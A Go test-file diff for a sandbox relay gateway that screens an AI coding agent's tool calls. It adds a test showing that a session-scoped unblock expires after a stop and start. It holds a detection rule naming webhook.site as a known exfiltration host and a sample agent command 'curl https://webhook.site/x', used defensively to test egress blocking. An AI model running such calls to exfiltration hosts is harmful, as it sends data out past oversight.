@@ -217,27 +217,13 @@ func TestManagedSandboxAgentIsToldOfTheDaemonsEgressRefusals(t *testing.T) {
 // registration's, not under a floor that no longer allows unblocks, not
 // over a user block, and never because of anything the daemon sends.
 func TestManagedSandboxUnblockLiftsOnlyAnUnblockTheGatewayKeeps(t *testing.T) {
-	resetConnectorRuleCategories(t)
-	pack := &guardrail.RulePack{RuleFiles: []*guardrail.RulesFileYAML{{Version: 1, Category: "c2", Rules: []guardrail.RuleDefYAML{
-		{ID: "C2-WEBHOOK-SITE", Pattern: `(?i)(?:^|[^a-zA-Z0-9-])webhook\.site(?:[^a-zA-Z0-9.-]|$)`, Title: "webhook.site (known exfil)",
-			Severity: "CRITICAL", Confidence: 0.99},
-	}}}}
-	if err := ApplyRulePackOverrides(pack); err != nil {
-		t.Fatal(err)
-	}
+	useWebhookSiteRule(t)
 	gw := newRelayFixture(t)
 	reg := gw.register(t, "unbclaude", "claudecode", relayTestBindingID(0xf11))
 	other := gw.register(t, "unbother", "claudecode", relayTestBindingID(0xf12))
-	body := `{"hook_event_name":"PreToolUse","session_id":"u1","tool_name":"Bash","tool_input":{"command":"curl https://webhook.site/x"},"tool_use_id":"u1","cwd":"/sandbox"}`
 	action := func(headers ...string) string {
 		t.Helper()
-		resp, raw := gw.post(t, sandboxrelay.PathHookPrefix+"claudecode", reg.ID, body, headers...)
-		var out map[string]interface{}
-		if err := json.Unmarshal([]byte(raw), &out); err != nil || resp.StatusCode != http.StatusOK {
-			t.Fatalf("relayed hook: %d %s", resp.StatusCode, raw)
-		}
-		a, _ := out["action"].(string)
-		return a
+		return relayedWebhookCurl(t, gw, reg.ID, headers...)
 	}
 	decide := func(registration, kind, scope string) {
 		t.Helper()
@@ -288,5 +274,80 @@ func TestManagedSandboxUnblockLiftsOnlyAnUnblockTheGatewayKeeps(t *testing.T) {
 	decide(reg.ID, sandboxrelay.DecisionEgressBlock, sandboxrelay.DecisionScopeAlways)
 	if got := action(); got != "block" {
 		t.Fatalf("over a user block: %q", got)
+	}
+}
+
+// useWebhookSiteRule makes C2-WEBHOOK-SITE, a CRITICAL block of a call that
+// names webhook.site, the one destination rule of the test.
+func useWebhookSiteRule(t *testing.T) {
+	t.Helper()
+	resetConnectorRuleCategories(t)
+	pack := &guardrail.RulePack{RuleFiles: []*guardrail.RulesFileYAML{{Version: 1, Category: "c2", Rules: []guardrail.RuleDefYAML{
+		{ID: "C2-WEBHOOK-SITE", Pattern: `(?i)(?:^|[^a-zA-Z0-9-])webhook\.site(?:[^a-zA-Z0-9.-]|$)`, Title: "webhook.site (known exfil)",
+			Severity: "CRITICAL", Confidence: 0.99},
+	}}}}
+	if err := ApplyRulePackOverrides(pack); err != nil {
+		t.Fatal(err)
+	}
+}
+
+// relayedWebhookCurl relays a Claude Code PreToolUse of `curl
+// https://webhook.site/x` for registration, as its daemon does, and returns
+// the verdict's action.
+func relayedWebhookCurl(t *testing.T, gw *relayFixture, registration string, headers ...string) string {
+	t.Helper()
+	body := `{"hook_event_name":"PreToolUse","session_id":"u1","tool_name":"Bash","tool_input":{"command":"curl https://webhook.site/x"},"tool_use_id":"u1","cwd":"/sandbox"}`
+	resp, raw := gw.post(t, sandboxrelay.PathHookPrefix+"claudecode", registration, body, headers...)
+	var out map[string]interface{}
+	if err := json.Unmarshal([]byte(raw), &out); err != nil || resp.StatusCode != http.StatusOK {
+		t.Fatalf("relayed hook: %d %s", resp.StatusCode, raw)
+	}
+	a, _ := out["action"].(string)
+	return a
+}
+
+// GAP-0009: a session unblock is the sandbox's for the session it was made
+// in. The registration outlives a stop and start and the gateway kept the
+// unblock, so it went on lifting the destination rule in every later
+// session, while the daemon ends its own session unblocks when it starts
+// the sandbox again (es:GAP-0676). After a stop and start the earlier
+// session's unblock lifts nothing; the new session's own does, and an
+// unblock for every sandbox outlives the stop.
+func TestManagedSandboxSessionUnblockEndsWithItsSession(t *testing.T) {
+	useWebhookSiteRule(t)
+	gw := newRelayFixture(t)
+	reg := gw.register(t, "sesclaude", "claudecode", relayTestBindingID(0xf21))
+	unblock := func(scope string) {
+		t.Helper()
+		if err := gw.auth.decisions.Add(relayTestPeer.UID, sandboxreg.Decision{Registration: reg.ID, Kind: sandboxrelay.DecisionUnblock,
+			Host: "webhook.site", Scope: scope}); err != nil {
+			t.Fatal(err)
+		}
+	}
+	// The daemon's reports of a stop and a start (sandboxreg.FileStore.Report).
+	stopAndStart := func() {
+		t.Helper()
+		for _, running := range []bool{false, true} {
+			if _, err := gw.auth.store.Report(relayTestPeer.UID, reg.ID, running); err != nil {
+				t.Fatal(err)
+			}
+		}
+	}
+	unblock(sandboxrelay.DecisionScopeSession)
+	if got := relayedWebhookCurl(t, gw, reg.ID); got != "allow" {
+		t.Fatalf("in the unblock's session: %q", got)
+	}
+	stopAndStart()
+	if got := relayedWebhookCurl(t, gw, reg.ID); got != "block" {
+		t.Fatalf("the last session's unblock lifted the block after a stop and start: %q", got)
+	}
+	unblock(sandboxrelay.DecisionScopeSession)
+	if got := relayedWebhookCurl(t, gw, reg.ID); got != "allow" {
+		t.Fatalf("the new session's own unblock: %q", got)
+	}
+	unblock(sandboxrelay.DecisionScopeAlways)
+	stopAndStart()
+	if got := relayedWebhookCurl(t, gw, reg.ID); got != "allow" {
+		t.Fatalf("an unblock for every sandbox after a stop and start: %q", got)
 	}
 }
